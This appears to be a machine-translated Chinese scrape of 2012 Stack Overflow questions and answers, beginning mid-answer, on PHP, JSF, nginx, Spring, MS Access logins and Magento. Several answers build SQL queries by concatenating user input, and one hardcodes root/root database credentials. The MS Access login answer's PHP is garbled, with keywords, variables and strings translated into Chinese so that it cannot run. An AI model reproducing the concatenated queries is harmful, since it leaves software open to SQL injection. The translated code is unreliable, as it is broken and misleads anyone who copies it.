> 时间：2012-04-10T06:36:14.270

```
if($dArray[0] == 'sb2a')
{
   $sql = "SELECT * FROM Vehicles WHERE " . $dArray[1] . " = \'" . $dArray[2] . "\'";
}
print($sql); 
```

对于连接，我们应该始终使用 '.'

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-10T06:30:19.120

查询应该是这样的。

```
$sql = "SELECT * FROM Vehicles WHERE {$dArray[1]}  = '{$dArray[2]}'"; 
```

# javascript - Tweet 按钮在 IE7 中无法正确显示，但在 mozilla、chrome 和 IE 8 中工作正常

> ID：10084106
> 
> 赞同：1
> 
> 时间：2012-04-10T06:28:56.200
> 
> 标签：javascript, twitter

我在我的网站中添加了推特按钮代码，该代码是从推特资源（默认 JavaScript 版本）生成的。此代码工作正常，并在 mozilla、chrome 和 IE 8 中正确显示推文按钮，但在 IE 7 中未正确显示相同的页面。在 IE 7 中，推文按钮的宽度显示得非常高，它显示水平滚动条。为什么会这样？

提前致谢...

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-21T10:19:12.397

这是 IE7 中的一个已知问题，此错误已根据 twitter 修复。

[https://dev.twitter.com/issues/200](https://dev.twitter.com/issues/200)

# sql-server - SQL Server 2008 R2 - 如何重命名多个列名？

> ID：10084107
> 
> 赞同：1
> 
> 时间：2012-04-10T06:29:08.313
> 
> 标签：sql-server, sql-server-2008, tsql, ddl

我对 SQL Server 2008 没有太多经验，我想重命名数据库中的所有列（在现有名称中添加一些前缀）。

我在想类似的事情：

```
Foreach( column in table)
(
    column_name = prefix+column_name
) 
```

有什么办法吗？？

非常感谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-10T06:40:57.060

您可以尝试以下解决方案：使用游标遍历[sys.columns](http://msdn.microsoft.com/en-us/library/ms176106%28v=sql.100%29.aspx)表中的记录，并为每条记录执行[sp_rename](http://msdn.microsoft.com/en-us/library/ms188351%28v=sql.100%29.aspx)系统存储过程。我认为重命名时可能存在完整性问题，因此您需要小心引用这些列的其他对象（例如存储过程）。

更新：MVP 说：

> [如果您有任何索引、主键、唯一键或外键，则需要在重命名列后删除它们，然后再读取它们。如果您没有按正确的顺序执行此操作，您将收到很多令人讨厌的错误消息。](http://www.sql-server-performance.com/forum/threads/are-there-any-known-issue-using-sp_rename.4676/#post-30482)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-10T06:37:27.433

您可以尝试使用[sp_RENAME](http://blog.sqlauthority.com/2008/08/26/sql-server-how-to-rename-a-column-name-or-table-name/)。它一次只允许单列。但是您可以在代码上执行此操作以在每一列上循环。希望能帮助到你。谢谢！

# html - Html 标题和链接在同一行

> ID：10084113
> 
> 赞同：6
> 
> 时间：2012-04-10T06:29:43.070
> 
> 标签：html, css

我是 CSS 新手。我想在同一行的中心显示标题 h2 和右端的链接。

我尝试了几个选项，但所有选项都将标题向左对齐。任何帮助表示赞赏。

谢谢。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-04-10T06:43:23.110

有几种方法可以做到这一点。我能想到的最简单和最快的方法是使用父 div 并将标题和链接放入其中。因此，您的 HTML 将如下所示：

```
<div class="test">
    <h2>Heading comes here</h2><a href="">Link comes here</a>
</div> 
```

您的样式可以如下所示：

```
.test {
    text-align: center;
}
h2 {
    display: inline-block;
}

a {
    float: right;
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-10T06:39:42.037

像这样写：

**HTML**

```
<h1>heading <a href="#">link</a></h1> 
```

**CSS**

```
h1{
    text-align:center;
}
h1 a{
    float:right;
} 
```

检查这个[http://jsfiddle.net/KJSmB/](http://jsfiddle.net/KJSmB/)

# ruby-on-rails - after_update_save 如何在 activescaffold rails 中工作？

> ID：10084119
> 
> 赞同：0
> 
> 时间：2012-04-10T06:30:19.027
> 
> 标签：ruby-on-rails, activescaffold

1.  我在控制器测试中有一个：action => create_something，它将数据保存在数据库中，然后重定向到 `redirect_to url_for :controller => 'test', :action => 'edit'`：id => 'test_id'
2.  在此之后有 activescaffold 生成的按钮“更新”。更新后所有值都存储在数据库中。
3.  在此之后，我想重定向到其他页面。我怎样才能在“after_update_save”动作中写出来。？
4.  这是足够的信息还是我应该提供更多信息？

感谢您的帮助 ：）。

# jsf - 单击编辑按钮时将数据表 outputText 更改为 inputText

> ID：10084121
> 
> 赞同：0
> 
> 时间：2012-04-10T06:30:19.873
> 
> 标签：jsf, jsf-2

我正在尝试在来自数据库的 jsf 可数据数据中显示数据，并且在同一行中显示编辑链接。现在，当用户单击编辑按钮时，它应该是来自 outputText 的 inputText。在这里我已经完成了编码，但我无法更改文本框，你能帮帮我吗？提前致谢。

显示数据.xhtml

```
<h:dataTable value="#{customerdata.customerList}" var="c" 
            styleClass="order-table" binding="#{customerdata.dataTable}"
            headerClass="order-table-header" border="1" width="100%"
            rowClasses="order-table-odd-row,order-table-even-row" rows="3">

        <h:column>
            <h:selectBooleanCheckbox></h:selectBooleanCheckbox>
        </h:column>
        <h:column>
        <f:facet name="heder">User ID</f:facet>
            <h:inputText value="#{c.cust_id}" size="10" rendered="#{c.editable}"/>
            <h:outputLabel value="#{c.cust_id}" rendered="#{not c.editable}" />
        </h:column>

        <h:column>
        <f:facet name="heder">User Name</f:facet>
            <h:inputText value="#{c.cust_name}" size="10" rendered="#{c.editable}"/>
            <h:outputLabel value="#{c.cust_name}" rendered="#{not c.editable}" />
        </h:column>

        <h:column>              
            <h:commandLink value="Update" rendered="#{c.editable}" action="#{customerdata.editAction(c)}" />
            <h:commandLink value="Edit" action="#{customerdata.editAction(c)}" rendered="#{not c.editable}"/>
        </h:column>

        <h:column>              
            <h:commandLink value="Delete" action="#{customerdata.deleteAction(c)}" />
        </h:column>

        <!-- Footer Setting -->
        <f:facet name="footer">
        <h:panelGroup>
            <h:commandButton value="prev" action="#{customerdata.pagePrevious}"
                disabled="#{customerdata.dataTable.first == 0}" />
            <h:commandButton value="next" action="#{customerdata.pageNext}"
                disabled="#{customerdata.dataTable.first + customerdata.dataTable.rows
                    >= customerdata.dataTable.rowCount}" />

         </h:panelGroup>
        </f:facet>

    </h:dataTable> 
```

客户数据.java

```
 package model;

@ManagedBean(name="customerdata")
public class CustomerData implements Serializable {

    private static final long serialVersionUID = 1L;

    Connection con;
    Statement smt;
    HtmlDataTable dataTable;
    //Customer cust=new Customer();

    public List<Customer> getcustomerList() throws SQLException{
        //System.out.println("in getcustomerlist");
        List<Customer> list= new ArrayList<Customer>();
        try{

            Class.forName("com.mysql.jdbc.Driver");
            con = DriverManager.getConnection("jdbc:mysql://localhost:3306/openid","root","root");
            smt = con.createStatement();

            String query="select * from jsftable";
            ResultSet rs= smt.executeQuery(query);

            while(rs.next()){

                Customer cust = new Customer();

                cust.setCust_id(rs.getInt("cust_id"));
                cust.setCust_name(rs.getString("cust_name"));
                cust.setHas_attachment(rs.getBoolean("has_attachment"));
                System.out.println("in cusotomer data"+cust.isEditable());
                //store all data into a List
                list.add(cust);
            }

        }
        catch(Exception e){
            e.printStackTrace();
        }
    return list;
    }

    public void pageFirst() {
        dataTable.setFirst(0);
    }

    public void pagePrevious() {
        dataTable.setFirst(dataTable.getFirst() - dataTable.getRows());
        System.out.println("Prevoius"+dataTable.getFirst());
    }

    public void pageNext() {
        dataTable.setFirst(dataTable.getFirst() + dataTable.getRows());
        System.out.println("Next"+dataTable.getFirst());
    }

    public void pageLast() {
        int count = dataTable.getRowCount();
        int rows = dataTable.getRows();
        dataTable.setFirst(count - ((count % rows != 0) ? count % rows : rows));
    }

    public HtmlDataTable getdataTable() {
        return dataTable;
    }

    public void setdataTable(HtmlDataTable dataTable) {
        this.dataTable = dataTable;
    }

    public void showRow(){
        System.out.println(dataTable.getRows());
    }
    public String deleteAction(Customer customer) throws SQLException{

        //list.remove(customer);
        //System.out.println(customer.cust_id);

        try{
            Class.forName("com.mysql.jdbc.Driver");
            con = DriverManager.getConnection("jdbc:mysql://localhost:3306/openid","root","root");
            smt = con.createStatement();

            String query="delete from jsftable where cust_id="+customer.cust_id+"";
            //ResultSet rs= smt.executeQuery(query);
            smt.executeUpdate(query);

        }
        catch(Exception e){

            e.printStackTrace();
        }

        return null;
    }

    public String editAction(Customer customer) {

        //list.remove(customer);
        System.out.println(customer.cust_id);

        customer.setEditable(true);
        return null;
    }

} 
```

客户.java

```
public class Customer {

int cust_id;
String cust_name;
boolean has_attachment;
boolean editable;
String edit_value;

public String getEdit_value() {
    System.out.println("in getter");
    return edit_value;
}
public void setEdit_value(String editvalue) {
    this.edit_value = editvalue;
}
public boolean isHas_attachment() {
    System.out.println("in getter of has_attach");
    return has_attachment;
}
public void setHas_attachment(boolean hasAttachment) {
    has_attachment = hasAttachment;
}
public int getCust_id() {
    System.out.println("in getter of cust_id");
    return cust_id;
}
public void setCust_id(int custId) {
    cust_id = custId;
}
public String getCust_name() {
    return cust_name;
}
public void setCust_name(String custName) {
    cust_name = custName;
}
public boolean isEditable() {
    //System.out.println("in isEditable"+editable);
    return editable;
}
public void setEditable(boolean editable) {

    this.editable = editable;
    //System.out.println("in set editable"+editable);
} 
```

}

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-10T07:34:17.683

老实说，我想知道您的代码是如何工作的。它有几个主要缺陷。

你应该从

*   给你的托管 bean 一个范围，这`@ViewScoped`似乎是最合适的（见[这里](http://mkblog.exadel.com/2009/08/learning-jsf2-managed-beans/)）
*   从 getter 方法中删除数据库访问。将它放在`@PostConstruct`bean 中的带注释的方法中。在 JSF 生命周期中可以多次调用 Getter 方法。该`@PostConstruct`方法仅在 bean 构造之后。
*   完成后关闭 sql 语句和连接（`stmt.close()`和`con.close()`）
*   以下 bean 字段和方法命名约定：私有字段`xxx`有一个 getter`getXxx`和一个 setter `setXxx`（大写很重要）
*   删除数据表绑定。这里没有必要。

我建议通过 BalusC 完成这个[简单的 CRUD 示例](http://balusc.blogspot.de/2010/06/benefits-and-pitfalls-of-viewscoped.html)，并根据您的功能要求对其进行调整。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-10T07:38:42.630

1.  为数据表添加 id 标签：

```
<h:dataTable value="#{customerdata.customerList}" var="c" id="customerDT"
            styleClass="order-table" binding="#{customerdata.dataTable}"
            headerClass="order-table-header" border="1" width="100%"
            rowClasses="order-table-odd-row,order-table-even-row" rows="3"> 
```

1.  添加您的编辑命令按钮更新标签：

但是为什么不使用primefaces 使用inplace 组件呢？[http://www.primefaces.org/showcase-labs/ui/inplace.jsf](http://www.primefaces.org/showcase-labs/ui/inplace.jsf)（需要保存按钮）

# php - 我如何定义 $db？注意：未定义变量：db

> ID：10084124
> 
> 赞同：-2
> 
> 时间：2012-04-10T06:30:38.293
> 
> 标签：php, mysql, ajax

但是，由于我对 php 中的 oop 不太熟悉。我不确定我需要将 $db 变量定义为什么，以便正确查询我的数据库。他们是我可以编辑此代码的一种方式，因此它回避了 $db 并使用了不同的方法，该代码使用 ajax 加载更多帖子。错误在第 24 行

```
<html> 
<head> 
<script> 
$(document).ready(function(){ 
$("#loadmorebutton").click(function (){ 
    $('#loadmorebutton').html(''); 
$.ajax({ 
    url: "loadmore.php?lastid=" + $(".postitem:last").attr("id"), 
    success: function(html){ 
        if(html){ 
            $("ul#posts").append(html); 
            $('#loadmorebutton').html('Load More'); 
        }else{ 
            $('#loadmorebutton').replaceWith('No more posts to show.'); 
        } 
    } 
}); 
}); 
}); 
</script> 
</head> 
<body> 
<?php 
if($posts = $db->get_results("SELECT id,text FROM posts ORDER BY id DESC LIMIT 10")) { 
echo '<ul id="posts">'; 
foreach($posts as $post) { 
    echo '<li class="postitem" id="'.$post->id.'">'.$post->text.'</li>'; 
} 
echo '</ul>'; 
} 
?> 
<button id="loadmorebutton">Load More</button> 
</body> 
</html> 
```

**装载更多**

```
<?php 
if($_GET['lastid']){ 
if($posts = $db->get_results("SELECT id,text FROM posts WHERE id < ".$db-    >escape($_GET['lastid'])." ORDER BY id DESC LIMIT 10")) { 
    foreach($posts as $post) { 
        echo '<li class="postitem" id="'.$post->id.'">'.$post->text.'</li>'; 
    } 
} 
} 
?> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-10T06:35:14.660

如果您不习惯面向对象的 PHP 但您需要构造对象，这将证明是复杂的。例如， MySQLi 类[构造函数](http://php.net/manual/en/mysqli.construct.php)接受用户、密码、数据库等，然后知道它应该连接到哪里。

在你可以使用像 $db->get_results 这样的东西之前，你需要构造你的 DB 对象。现在我不认识 get_results 函数，所以我认为它是一个自定义构建的 DB 类。如果您想知道该怎么做，您应该查看该特定类的文档。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-10T06:48:01.187

代码看起来很复杂，但如果你想这样写`$db->get_results`。您必须在使用主机名、用户、数据库和密码设置数据库连接的构造函数中创建一个数据库类。

之后，您在该类中定义一个方法**get_result**，然后创建该类的对象，`$dg=new Database();`然后您可以使用`$db->get_result`.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-11T09:47:03.087

与其教你——这里的答案需要很长时间，而是阅读 PHP 的 OO 页面： http: [//php.net/manual/en/language.oop5.php](http://php.net/manual/en/language.oop5.php)

它不会花费您很长时间，并且会帮助您了解基础知识，并帮助解决您在使用 OO 代码时不断遇到的任何问题。

# c# - 如何首先显示警报框，然后重定向到带有查询字符串的任何页面？

> ID：10084125
> 
> 赞同：0
> 
> 时间：2012-04-10T06:30:42.713
> 
> 标签：c#

```
ScriptManager.RegisterStartupScript(UpdatePanel2, this.GetType(), "click", "alert('This Email address is already registered...');window.location.href ='test.aspx'", true); 
```

通过使用上面的代码，我能够显示警报框，然后重定向到 test.aspx 页面。

但是当我必须传递带有地址的查询字符串时，问题就来了：

```
ScriptManager.RegisterStartupScript(UpdatePanel2, this.GetType(), "click", "alert('This Email address is already registered...');window.location.href ='test.aspx?WidgetID='" + Request.QueryString["WidgetID"] + "'&lan='" + readCookie() + "'&seeHome=true'", true); 
```

提前致谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-10T06:41:21.960

您的代码有不必要**的 (')**会破坏 javascript 中的字符串。试试这个

```
ScriptManager.RegisterStartupScript(UpdatePanel2, this.GetType(), "click", "alert('This Email address is already registered...');window.location.href ='test.aspx?WidgetID=" + Request.QueryString["WidgetID"] + "&lan=" + readCookie() + "&seeHome=true'", true); 
```

# xml - 使用 Ant 生成 XML 报告，但是如何？

> ID：10084127
> 
> 赞同：1
> 
> 时间：2012-04-10T06:30:58.763
> 
> 标签：xml, ant, junit

目前我想在 Jenkins 中获得测试结果。我正在处理的唯一问题是我可以从我的 Junit 测试中获取 XML 报告。所以我的问题是：

1.  是否有可能与 Jenkins 一起开始测试并获得结果？

2.  或者是否可以使用 Ant 生成 xml 报告，以及如何生成？因为我有这个但100％不明白：

我的测试路径：

*   nl\company\cms\plugin\test\AllTests.java（测试套件）
*   CopyOfMyTestClass.java（单个测试类）
*   MyTestClass.java（单个测试类）

我的图书馆的路径：

*   lib\junit-4.10.jar
*   lib\ant.jar （这个在我的插件中是必需的，可能对于构建 XML 报告也是必需的？）

我从 JUnit 站点获得的这段代码：http: [//junit.sourceforge.net/doc/faq/faq.htm#running_6](http://junit.sourceforge.net/doc/faq/faq.htm#running_6)

* * *

我理解以下内容： `${test.reports}`= 您想要测试报告的位置 `${classes}`= .java 文件已经构建到 .class 文件中的 bin 目录。是否也可以将它们转发到 .java 文件？

但我不知道如何处理以下内容：

```
<classpath refid="test.classpath" /> 
```

已经谢谢了！

**更新**

他找到了我的 3 个测试类并建立了一个报告，但是我在报告中的这三个类中得到了同样的错误：

test.AllTests

```
java.lang.ClassNotFoundException: test.AllTests
at java.net.URLClassLoader$1.run(URLClassLoader.java:202)
at java.security.AccessController.doPrivileged(Native Method)
at java.net.URLClassLoader.findClass(URLClassLoader.java:190)
at java.lang.ClassLoader.loadClass(ClassLoader.java:306)
at sun.misc.Launcher$AppClassLoader.loadClass(Launcher.java:301)
at java.lang.ClassLoader.loadClass(ClassLoader.java:247)
at java.lang.Class.forName0(Native Method)
at java.lang.Class.forName(Class.java:169) 
```

这是我的 build.xml 代码：

```
<property name="basedir" value="C:/CMSdot2"/>
<property name="classes" value="C:/CMSdot2/dotCMS/WEB-INF/classes/nl/company/dotcms/plugin"/>
<property name="test.reports" value="${basedir}/dotCMS/"/>
<target name="test-html">
 <junit fork="yes" printsummary="no" haltonfailure="no">
  <batchtest fork="yes" todir="${test.reports}" >
   <fileset dir="${classes}">
    <include name="**/*Test*.class" />
   </fileset>
  </batchtest>
  <formatter type="xml" />
  <classpath id="test.classpath">
   <pathelement location="lib/junit-4.10.jar"/>
  </classpath>
 </junit>
 <junitreport todir="${test.reports}">
  <fileset dir="${test.reports}">
   <include name="TEST-*.xml" />
  </fileset>
  <report todir="${test.reports}" />
 </junitreport>
</target> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-10T07:25:50.610

1.  您必须指定`${classes}`指向类。Java 需要类来执行程序/junit，所以`.java`文件不会这样做。
2.  如果您有运行测试所需的外部库（如 log4j 或 apache commons），则需要`<classpath refid="test.classpath" />`包含您的类和任何 eyternal 库。例如：

    ```
    <classpath id="test.classpath">
        <pathelement location="${classes}" />
        <pathelement location="lib/ther.jar"/>
    </classpath> 
    ```

# ios5 - 为什么 UIImage 视图显示错误的图像大小

> ID：10084130
> 
> 赞同：3
> 
> 时间：2012-04-10T06:31:14.373
> 
> 标签：ios5, ios-simulator

我有尺寸为 1900x1200 的图像文件。在我的代码中，我尝试将其加载为

```
UIImage *image = [UIImage imageNamed:imageName]; 
```

当我尝试在 iPhone 模拟器（视网膜显示屏）中运行此代码时，我的图像看起来不成比例。我试图打印

image.size.width 和 image.size.height

我得到的值为950x600。

我做错了什么。请帮帮我。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-10T11:09:38.043

答案其实很简单：UIImageView（和底层的 UIImage）使用比例因子 2.0。也就是说，您的 1900x1200*像素*图像对应于视网膜显示器上比例因子为 2 的950x600*点图像。*您可以仔细检查 UIImage 的 scale 属性。

# javascript - 我可以使用任何 HTML 或 JavaScript API 在 input[type=file] 中获取文件的路径吗？

> ID：10084133
> 
> 赞同：4
> 
> 时间：2012-04-10T06:31:21.493
> 
> 标签：javascript, file, upload, path

我想实现一个上传图片功能。

上传后，我想获取文件本地路径，以便创建缩略图。但是我怎样才能得到文件路径呢？还有另一种创建缩略图的方法吗？

我试过 jQuery-File-Upload 插件。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-10T06:40:12.470

出于安全原因，无法获取文件路径。您只能通过`fakepath`从值中删除来获取文件名：`input.value.split("/")[1]`.

要创建缩略图，请使用已上传的文件，而不是本地文件。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-10T06:52:35.990

[jQuery File Upload Demo Page](http://blueimp.github.com/jQuery-File-Upload/)演示了获取要上传的文件名的概念。添加文件时，文件名显示在控件下方的表格视图中。

该插件有几个选项，包括在特定事件发生后触发的回调。

这是一个显示如何获取文件名的示例：

```
function (e, data) {
    $.each(data.files, function (index, file) {
        alert('Added file: ' + file.name);   // filename alerted
    });
    data.url = '/path/to/upload/handler.json';
    var jqXHR = data.submit()
        .success(function (result, textStatus, jqXHR) {/* ... */})
        .error(function (jqXHR, textStatus, errorThrown) {/* ... */})
        .complete(function (result, textStatus, jqXHR) {/* ... */});
} 
```

根据文档，如果您使用`.bind`jQuery 关键字绑定回调函数，您将有最大的成功机会：

```
$('#fileupload')
   .bind('fileuploadadd', function(e, data) { ... } ); 
```

**从有关“添加”的文档中：**

> data 参数允许覆盖插件选项以及定义 ajax 设置。data.files 保存上传请求的文件列表：如果启用了 singleFileUploads 选项（这是默认设置），将为 XHR 文件上传选择中的每个文件调用一次 add 回调，并带有 data.files 数组长度为一，因为每个文件都是单独上传的。否则，每次文件选择都会调用一次添加回调。

这是[jQuery 文件上传选项](https://github.com/blueimp/jQuery-File-Upload/wiki/Options)的完整列表。

此外，只有部分浏览器支持图像预览，这是您访问文件名的目标：

> **图像预览**
> 
> 以下浏览器支持上传文件前的图像预览：
> 
> *   火狐 3.6+
> *   谷歌浏览器
> *   歌剧 11+

浏览器[支持](https://github.com/blueimp/jQuery-File-Upload/wiki/Browser-support)页面详细说明了插件的哪些功能在不同的浏览器中受支持和不受支持。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-10T06:40:14.860

我认为 chrome 支持这一点，但不确定是否出于安全原因将其删除。无论如何，您可以尝试使用 javascrip 来设置某些 div 的自定义宽度和高度，并使用上传文件的 readAsDataURL

```
 <script type="text/javascript">     

function uploadFile(input) {         

if (input.files && input.files[0]) {            

 var reader = new FileReader();              
 reader.onload = function (e) {                 
 $('#test').attr('src', e.target.result).width(100).height(100);             
 };               
 reader.readAsDataURL(input.files[0]);        
 }     
} 

</script> 

<input type='file' onchange="uploadFile(this);" />     <img id="test" src="#" alt="my image" /> 
```

# nginx - nginx别名+位置指令

> ID：10084137
> 
> 赞同：10
> 
> 时间：2012-04-10T06:32:10.557
> 
> 标签：nginx, location, alias

```
server {
    listen      80;
    server_name  pwta; 
    root html;

    location /test/{
        alias html/test/;
        autoindex on;
    }
    location ~ \.php$ {
        fastcgi_pass   127.0.0.1:9000;
        fastcgi_index  index.php;
        fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;
        include        fastcgi_params;
    }
} 
```

此配置有效。但是，如果`location /test/`被替换，例如`location /testpath/`它不起作用（未指定输入文件）。我假设基于别名指令的解释，“位置”部分被删除，因此`/testpath/info.php`会导致`html/test/info.php`.

感谢您的任何建议。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-04-11T08:36:35.017

[nginx 别名](http://forum.nginx.org/read.php?2,3059,3060#msg-3060)

```
 server {
    listen      80;
    server_name  pwta;
    index index.html index.php;
    root html;

    location /testpath/ {
        alias html/test/;
    }
    location ~  ^/testpath/(.+\.php)$ { ### This location block was the solution
        alias html/test/;     
        fastcgi_pass   127.0.0.1:9000;
        fastcgi_index  index.php;
        fastcgi_param  SCRIPT_FILENAME  $document_root$1;
        include fastcgi_params;
    }
     location ~ \.php$ {
        fastcgi_pass   127.0.0.1:9000;
        fastcgi_index  index.php;
        fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;
        include        fastcgi_params;
    } 
```

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2013-11-18T19:30:36.107

`alias`和指令都`root`最好与绝对路径一起使用。您可以使用相对路径，但它们与`prefix`用于编译 nginx 的配置选项相关，通常不是您想要的。

您可以通过执行`nginx -V`并找到下面的值来看到这一点`--prefix=`。

通过查看日志向自己证明这一点，您会发现“没有此类文件”错误。

# .net - 对 WCF 数据服务和过时引用的担忧

> ID：10084140
> 
> 赞同：0
> 
> 时间：2012-04-10T06:32:37.667
> 
> 标签：.net, wcf-data-services, versioning, legacy-code

我正在寻找有关[WCF 数据服务](http://msdn.microsoft.com/en-us/data/bb931106 "关联")在被具有过时服务引用的应用程序引用时如何处理被调用的信息。

如果允许所有新添加的字段`null`并且我们没有破坏对象的任何现有链接，那么在托管仍在开发中并且经常被调用使用过时的 WCF 数据服务时，我们还需要注意什么？参考资料（来自第 3 方）。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-10T12:39:01.580

对于那些想知道的人，不确定我在所有搜索中是如何错过它的，但我在这里找到了答案：

[数据服务版本控制（WCF 数据服务）](http://msdn.microsoft.com/en-us/library/ee473427.aspx "关联")

**实体属性更改。**

**需要新版本：**

*   删除现有的财产或关系
*   添加不可为空的属性
*   更改现有属性

**不需要新版本：**

*   添加可为空的属性

附加说明：

> 您可以将该`IgnoreMissingProperties`属性设置为 true 以使客户端忽略由数据服务发送且未在客户端上定义的任何新属性。但是，在进行插入时，客户端未包含在 POST 请求中的属性将设置为其默认值。对于更新，客户端未知的属性中的任何现有数据都可能被默认值覆盖。在这种情况下，您应该将更新作为 MERGE 请求发送，这是默认设置。有关详细信息，请参阅管理数据服务上下文（WCF 数据服务）。

因此，只要您只添加可为空的属性，您就无需担心 WCF 数据服务的版本控制复杂性。

# java - 制作“TransactionAction”内部类

> ID：10084141
> 
> 赞同：0
> 
> 时间：2012-04-10T06:32:41.730
> 
> 标签：java, spring, hibernate, transactions, inner-classes

我有一个 Spring + Hibernate + MySQL web 应用程序，它现在只是一个 hello-world-test-area。

我的一个服务类实现了这个方法：

```
public List<Offerta> tutte() {
        List<Offerta> tutte = null;
        TransactionStatus status = txm.getTransaction( new DefaultTransactionDefinition() );
        try {
            tutte = dao.getAll(Offerta.class);
            txm.commit(status);
        } catch (Exception e) {
            e.printStackTrace();
            txm.rollback(status);
        }
        return tutte;
    } 
```

'txm' 是注入的 PlatformTransactionManager。

我现在想要的是避免在我的所有服务方法中重复“包装”事务代码！

我想要这样的东西：

```
someHelperTransactionClass.doThisInTransaction(new TransactionAction() {
  List l = dao.queryForSomething();
}); 
```

但这是一个内部类：我如何从中传入和传出数据？我的意思是，我怎样才能从那个 TransactionAction 中得到结果“l”列表？您可以通过多种方式回答这种特定情况，但我需要的是通用 TransactionAction 或不同的解决方案，让我编写实际的数据库代码，而不必每次都编写相同的无聊代码。

请不要回答“为什么不使用@Transactional 注释或AOP tx:advice 配置？” 因为我不能！为什么？我在 Google AppEngine 上，而那些很酷的人并不那么酷：对 javax.naming 包的禁用访问，以及声明性事务的那些很好的方式触及它。:-\

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-10T08:14:39.947

您可以使用 Proxy 对象来模仿基本的 AOP 机制。如[http://www.devx.com/Java/Article/21463/1954](http://www.devx.com/Java/Article/21463/1954)

这是一个模拟。但我真的怀疑它在 Spring 或 GAE 上的表现是否良好。请注意，您需要使用代理接口。

```
interface Dao {
    List<Foo> getAllFoo();
}

public class MyDao implements Dao {

    public MyDao() {
    }

    public List<Foo> getAllFoo() {
        //.. get list of foo from database. No need to use transactions
    }

    public static void main(String[] args) {
        Dao dao = new MyDao();
        InvocationHandler handler = new TransactionProxyHandler(dao);
        Dao proxy = (Dao) Proxy.newProxyInstance(MyDao.class.getClassLoader(), MyDao.class.getInterfaces(), handler);
        List<Foo> all = proxy.getAllFoo();
    }
}

class TransactionProxyHandler implements InvocationHandler {

    protected Object delegate;
    PlatformTransactionManager txm = new PlatformTransactionManager();

    public TransactionProxyHandler(Object delegate) {
        this.delegate = delegate;
    }

    public Object invoke(Object proxy, Method method, Object[] args)
            throws Throwable {
        TransactionStatus status = txm.getTransaction();
        Object res = null;
        try {
            res = method.invoke(delegate, args);
            txm.commit(status);
        } catch (Exception e) {
            e.printStackTrace();
            txm.rollback(status);
        }
        return res;
    }
} 
```

# php - 使用 PHP 检查 Microsoft Access 的简单登录

> ID：10084143
> 
> 赞同：0
> 
> 时间：2012-04-10T06:32:51.943
> 
> 标签：php, database, ms-access, authentication

我是 PHP 新手。我用用户 A 和 pw 123（测试）创建了一个 microsoft access 数据库。我试图在网站上找到，但不幸的是我找不到任何可以真正引导我对 MS Access 进行身份验证的网站，大部分网站都是关于 SQL 的，这是我真正不想要的，请帮助！

目前这里是我的代码

登录.php

```
<html>
<body>
<?php
session_start();
// dBase file
include "database.php";

<form id='login' action='login.php' method='post' accept-charset='UTF-8'>  
<fieldset >  
<legend>Please log in your employee ID and Password to apply for leave.</legend>  
<input type='hidden' name='submitted' id='submitted' value='1'/>
<div class='short_explanation'>* required fields</div>
<br>  
<label for='username'>UserName*:</label>  
<input type='text' name='username' id='username'  maxlength="50" />  
<br>
<label for='password'>Password*:&nbsp;</label>  
<input type='password' name='password' id='password' maxlength="50" />  
<br><br>
<input type='submit' name='Submit' value='Submit' />  
</fieldset> 
```

数据库.php

```
 <?php
 // This part sets up the connection to the 
 // database (so you don't need to reopen the connection
 // again on the same page).
 $conn=odbc_connect("employee","","") or die (odbc_errormsg());
 if (!$conn )
 {
 exit
 ("Error connecting to database: ".$conn);
 }
 // Then you need to make sure the database you want
 // is selected.
 $sql = "SELECT * FROM empTable";
 $rs=odbc_exec($conn,$sql);
 ?> 
```

我如何从这里继续？谢谢！请注意，我只能使用 MS Access 2003 对所有内容进行身份验证。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-10T07:25:23.673

```
    session_start();

    // 获取从用户那里收集的数据
    $用户名 =$_POST["用户名"];
    $Password =$_POST["密码"];

    if (!$conn = new COM("ADODB.Connection"))
    exit("无法创建 ADODB 连接
");
    $strConn = "DRIVER={Microsoft Access Driver (*.mdb)}; DBQ=". 真实路径（“数据库文件”）；
    $conn->open($strConn);

    $strSQL = "SELECT username, password FROM accounts WHERE username = '$Username' AND password = '$Password'";
    $rs = $conn->执行($strSQL);

    如果 (!$rs->EOF)
    {
      if ( $rs->Fields["用户名"]->值
           && $rs->Fields["Username"]->value == $Username
           && $rs->字段[“密码”]->值
           && $rs->Fields["Password"]->value == $Password
         )
      {
         $_SESSION["authenticatedUser"] = $用户名；
         // 重定位到登录页面
         header("位置：login.php");
      }
    }
    别的
    {
      $_SESSION["message"] = "$Username 登录错误。" ;
      header("位置：admin.php");
    }

```

# magento - 在评论表单中添加自定义字段

> ID：10084144
> 
> 赞同：1
> 
> 时间：2012-04-10T06:33:14.253
> 
> 标签：magento, magento-1.5

我期待在 Review form 中创建一个自定义字段“Email Id”和一个下拉菜单。

我试过这个但没有保存数据，它只是字段

app\code\core\Mage\Review\Model\Mysql4\Review.php

```
protected function _afterSave(Mage_Core_Model_Abstract $object)
{
$detail = array(
'title' => $object->getTitle(),
'detail' => $object->getDetail(),
'nickname' => $object->getNickname(),
'email' => $object->getEmail(), // New field 1
'fname' => $object->getFname(), // New field 2
); 
```

